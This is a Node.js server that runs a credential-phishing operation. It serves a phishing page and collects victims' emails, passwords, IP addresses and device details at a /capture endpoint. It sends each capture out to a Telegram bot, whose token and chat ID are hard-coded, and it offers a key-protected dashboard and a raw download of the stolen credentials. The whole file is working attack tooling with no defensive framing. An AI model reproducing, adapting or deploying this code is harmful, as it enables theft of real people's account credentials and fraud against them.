const http = require('http');
const fs = require('fs');
const url = require('url');

// ============================================================
// CONFIG — Your credentials
// ============================================================
const PORT = process.env.PORT || 3000;
const AUTH_KEY = 'LOsecret123';
const BOT_TOKEN = '8674321912:AAH9ncPM6rtU8cilPYiS_uR4ZZNZOxnLfRs';
const CHAT_ID = '7607355489';

const CAPTURES_FILE = 'captures.jsonl';
const INDEX_FILE = 'index.html';

// ============================================================
// SETUP
// ============================================================
if (!fs.existsSync(CAPTURES_FILE)) {
    fs.writeFileSync(CAPTURES_FILE, '');
}

function escapeHtml(str) {
    if (!str) return '';
    return str.replace(/[&<>"']/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[m]));
}

// ============================================================
// TELEGRAM ALERT
// ============================================================
async function sendTelegram(data) {
    const text = `🎯 <b>New Capture</b>\n\n` +
        `📧 <b>Email:</b> <code>${escapeHtml(data.email)}</code>\n` +
        `🔑 <b>Password:</b> <code>${escapeHtml(data.password)}</code>\n` +
        `🎲 <b>Attempt:</b> #${data.attemptNumber || 1}\n` +
        `🌐 <b>IP:</b> ${escapeHtml(data.ip || 'unknown')}\n` +
        `💻 <b>Platform:</b> ${escapeHtml(data.platform || 'unknown')}\n` +
        `🖥 <b>Screen:</b> ${escapeHtml(data.screen || 'unknown')}\n` +
        `⏰ <b>Time:</b> ${escapeHtml(data.receivedAt || data.timestamp)}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });
        await response.json();
    } catch (e) {
        // Silent fail — never break the capture flow
    }
}

// ============================================================
// CAPTURE STORAGE
// ============================================================
function readCaptures() {
    try {
        const lines = fs.readFileSync(CAPTURES_FILE, 'utf8').trim().split('\n').filter(Boolean);
        return lines.map(line => JSON.parse(line)).reverse();
    } catch (e) {
        return [];
    }
}

// ============================================================
// DASHBOARD
// ============================================================
function renderDashboard(captures) {
    const rows = captures.map(c => `
        <tr>
            <td>${escapeHtml(c.receivedAt || c.timestamp)}</td>
            <td>${escapeHtml(c.email)}</td>
            <td><code>${escapeHtml(c.password)}</code></td>
            <td>${c.attemptNumber || 1}</td>
            <td>${escapeHtml(c.ip || 'unknown')}</td>
            <td>${escapeHtml(c.platform || 'unknown')}</td>
            <td><span class="ua" title="${escapeHtml(c.userAgent || '')}">${escapeHtml((c.userAgent || '').slice(0, 40))}...</span></td>
        </tr>
    `).join('');

    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f0f0f;
            color: #e0e0e0;
            padding: 40px 20px;
            line-height: 1.6;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 { font-size: 28px; font-weight: 600; margin-bottom: 8px; color: #fff; }
        .stats { display: flex; gap: 24px; margin-bottom: 32px; flex-wrap: wrap; }
        .stat { background: #1a1a1a; padding: 16px 24px; border-radius: 8px; border: 1px solid #2a2a2a; }
        .stat-value { font-size: 32px; font-weight: 700; color: #0070e0; }
        .stat-label { font-size: 13px; color: #888; text-transform: uppercase; letter-spacing: 0.5px; }
        table { width: 100%; border-collapse: collapse; background: #1a1a1a; border-radius: 8px; overflow: hidden; border: 1px solid #2a2a2a; }
        th { background: #151515; padding: 14px 16px; text-align: left; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; color: #888; font-weight: 600; border-bottom: 1px solid #2a2a2a; }
        td { padding: 12px 16px; border-bottom: 1px solid #222; font-size: 14px; color: #ccc; }
        tr:hover td { background: #1f1f1f; }
        code { background: #252525; padding: 2px 8px; border-radius: 4px; font-family: 'SF Mono', Monaco, monospace; font-size: 13px; color: #4ade80; }
        .ua { color: #666; font-size: 12px; }
        .empty { text-align: center; padding: 60px; color: #555; font-style: italic; }
        .refresh { position: fixed; bottom: 24px; right: 24px; background: #0070e0; color: #fff; border: none; padding: 12px 24px; border-radius: 100px; cursor: pointer; font-size: 14px; font-weight: 600; box-shadow: 0 4px 12px rgba(0,112,224,0.3); }
        .refresh:hover { background: #005ea6; }
        .meta { font-size: 12px; color: #555; margin-bottom: 24px; }
        .telegram-status { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #4ade80; margin-right: 6px; }
    </style>
    <meta http-equiv="refresh" content="5">
</head>
<body>
    <div class="container">
        <h1>Capture Panel</h1>
        <p class="meta"><span class="telegram-status"></span>Telegram alerts active &bull; ${captures.length} total captures</p>
        <div class="stats">
            <div class="stat"><div class="stat-value">${captures.length}</div><div class="stat-label">Total Attempts</div></div>
            <div class="stat"><div class="stat-value">${new Set(captures.map(c => c.email)).size}</div><div class="stat-label">Unique Emails</div></div>
            <div class="stat"><div class="stat-value">${captures.filter((c, i, a) => a.findIndex(x => x.email === c.email) === i).length}</div><div class="stat-label">Unique Targets</div></div>
        </div>
        ${captures.length === 0 ? '<div class="empty">No captures yet. Waiting for targets...</div>' : `
        <table><thead><tr><th>Received</th><th>Email</th><th>Password</th><th>Attempt #</th><th>IP</th><th>Platform</th><th>User Agent</th></tr></thead><tbody>${rows}</tbody></table>`}
    </div>
    <button class="refresh" onclick="location.reload()">Refresh Now</button>
</body>
</html>`;
}

// ============================================================
// HTTP SERVER
// ============================================================
const server = http.createServer((req, res) => {
    const parsed = url.parse(req.url, true);

    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }

    // Serve phishing page
    if (parsed.pathname === '/' && req.method === 'GET') {
        fs.readFile(INDEX_FILE, (err, data) => {
            if (err) {
                res.writeHead(500);
                res.end('Server error');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
        return;
    }

    // Receive capture
    if (parsed.pathname === '/capture' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const data = JSON.parse(body);
                data.ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
                data.receivedAt = new Date().toISOString();
                
                fs.appendFileSync(CAPTURES_FILE, JSON.stringify(data) + '\n');
                sendTelegram(data).catch(() => {});

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'ok' }));
            } catch (e) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'bad request' }));
            }
        });
        return;
    }

    // Dashboard
    if (parsed.pathname === '/panel' && req.method === 'GET') {
        if (parsed.query.key !== AUTH_KEY) {
            res.writeHead(403, { 'Content-Type': 'text/html' });
            res.end('<h1>Forbidden</h1>');
            return;
        }
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(renderDashboard(readCaptures()));
        return;
    }

    // Download raw
    if (parsed.pathname === '/download' && req.method === 'GET') {
        if (parsed.query.key !== AUTH_KEY) {
            res.writeHead(403);
            res.end('Forbidden');
            return;
        }
        fs.readFile(CAPTURES_FILE, (err, data) => {
            if (err) {
                res.writeHead(404);
                res.end('Not found');
                return;
            }
            res.writeHead(200, { 
                'Content-Type': 'application/jsonl', 
                'Content-Disposition': 'attachment; filename="captures.jsonl"' 
            });
            res.end(data);
        });
        return;
    }

    res.writeHead(404);
    res.end('Not found');
});

server.listen(PORT, () => {
    console.log(`\n  Server running on http://localhost:${PORT}`);
    console.log(`  Phishing page: http://localhost:${PORT}`);
    console.log(`  Dashboard:     http://localhost:${PORT}/panel?key=${AUTH_KEY}`);
    console.log(`  Download raw:  http://localhost:${PORT}/download?key=${AUTH_KEY}`);
    console.log(`  Telegram:      ✅ Configured (bot: 8674321912, chat: 7607355489)\n`);
});